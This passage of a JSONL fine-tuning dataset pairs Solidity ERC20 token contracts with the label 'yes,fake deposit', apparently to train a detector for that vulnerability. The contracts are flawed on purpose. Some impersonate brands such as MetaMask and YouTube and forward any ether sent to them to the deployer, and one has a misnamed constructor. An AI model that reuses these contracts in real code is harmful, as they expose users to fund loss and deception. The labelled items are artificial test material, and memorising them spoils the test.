owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 10000000000000000; // Update total supply (100000 for example)\n name = \"Hodu Commemorative Coins\"; // Set the name for display purposes\n decimals = 8; // Amount of decimals for display purposes\n symbol = \"HODU\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract MetaMaskToken is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Meta Mask Token\";\n string public constant symbol = \"MASK\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\ncontract ERC20Token is StandardToken {\n\n function () {\n throw;\n }\n\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"train.exchange\";\n decimals = 0;\n symbol = \"TRAIN\";\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract CryptoCoin is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is CryptoCoin {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 5000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 5000000000; // Update total supply (100000 for example)\n name = \"CryptoCoin\"; // Set the name for display purposes\n decimals = 1; // Amount of decimals for display purposes\n symbol = \"CCO\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract PregnantButtToken {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract pbutttoken is PregnantButtToken {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract PREGNANTBUTT is pbutttoken {\n\n function () {\n throw;\n }\n\n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'H1.0'; \n\n\n function PREGNANTBUTT(\n ) {\n balances[msg.sender] = 250000000000000000000000000; \n totalSupply = 250000000000000000000000000; \n name = \"pregnantbutt.finance\"; \n decimals = 18; \n symbol = \"PBUTT\"; \n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'ShibaInuBurger' token contract\n//\n// Symbol : SIB \ud83c\udf54\n// Name : Shiba Inu Burger\n// Total supply: 100000000000000\n// Decimals : 18\n// Burned : 50%\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract ShibaInuBurger is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Shiba Inu Burger\";\n string public constant symbol = \"SIB \ud83c\udf54\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// YouTube Official Token\n// https://youtube.com\n// https://twitter.com/YouTube\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract YouTubeOfficialToken is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"YouTube Official Token\";\n string public constant symbol = \"YOUTUBE\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Moon_Shib is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Moon Shib\";\n string public constant symbol = \"MOONSHIB\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Rocket_Shib is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Rocket Shib\";\n string public constant symbol = \"RSHIB\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract Nabla is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\nfunction ERC20Token(\n) {\nbalances[msg.sender] = 10000000000; // Give the creator all initial tokens (100000 for example)\ntotalSupply = 10000000000; // Update total supply (100000 for example)\nname = \"Nabla\"; // Set the name for display purposes\ndecimals = 8; // Amount of decimals for display purposes\nsymbol = \"NBL\"; // Set the symbol for display purposes\n}\n \n\nfunction approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\n \n//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n//receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n//it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract HyperInuShiba is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Hyper Inu Shiba\";\n string public constant symbol = \"HYPERINU\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
